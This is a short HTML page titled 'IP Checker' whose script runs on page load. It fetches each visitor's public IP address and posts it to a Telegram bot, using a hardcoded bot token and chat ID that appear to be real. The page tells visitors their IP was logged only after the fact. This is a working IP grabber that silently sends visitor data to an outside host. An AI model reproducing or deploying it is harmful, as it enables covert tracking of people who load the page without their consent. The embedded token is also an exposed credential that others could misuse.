<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Checker</title>
    <script>
        async function sendIPToTelegram() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;
                const botToken = '7393833255:AAEHbjSRIky-AFJNFCXqfdfMv7UHWla_T3s';  // Replace with your bot token
                const chatId = '5293126208';     // Replace with your chat ID
                const message = `User IP: ${ipAddress}`;
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });
                console.log('IP sent successfully!');
            } catch (error) {
                console.error('Failed to send IP:', error);
            }
        }
        
        window.onload = sendIPToTelegram;
    </script>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <p>Your IP address has been logged.</p>
</body>
</html>
